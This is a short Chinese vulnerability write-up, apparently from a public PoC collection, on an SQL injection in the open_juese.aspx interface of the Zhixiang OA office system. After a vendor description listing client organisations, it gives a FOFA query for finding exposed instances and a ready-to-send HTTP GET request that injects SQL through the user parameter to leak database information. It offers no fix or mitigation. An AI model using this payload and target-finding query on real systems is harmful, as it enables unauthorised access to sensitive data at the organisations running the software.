# 致翔OA系统接口open_juese存在SQL注入漏洞
      致翔科技由广州致翔计算机科技有限公司和深圳分公司以及各地还有多家办事处组成，是以IT软件技术和管理不断创新为核心的客户需求导向型的高新技术和双软认证软件技术公司。致翔公司产品核心团队主要由具备多年实际企业管理与IT研发经验的专家级技术人才组成，研发与经营产品系列包括:集成多个行业应用功能的智慧协同平台，以及PC网站，手机APP、微信端的研发，可以为企事业单位，教育机构提供行业版本基础上按需定制的管理系统解决方案，目前已经成功应用在华为技术，铁通广东分公司，深圳海丽达幼儿园集团，广州卫监所，东莞南开学校，福州高级中学，长沙明达学校，上海中学东校，深圳凯卓立液压，中国路港集团，南方周末，广东煌上煌食品集团，广州天马摩托车集团公司，深圳电信实业，广东冠盛集团等超过1000家企事业单位，取得了显著的经济和管理效益。致翔OA open_juese存在SQL注入漏洞，未经授权的攻击者可通过该漏洞获取数据库敏感信息。

## fofa
```javascript
app="致翔软件-致翔OA"
```

![](https://cdn.nlark.com/yuque/0/2024/png/1622799/1727332106847-17eef327-0131-44fc-8f66-5e218638666a.png)

## poc
```java
GET /OpenWindows/open_juese.aspx?key=1&name=1&user=-1)+and+1=user--+&requeststr= HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate, br, zstd
Accept: */*
```

![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1731984893405-50be8661-ec4c-4cb0-b0ba-d33128548e03.png)

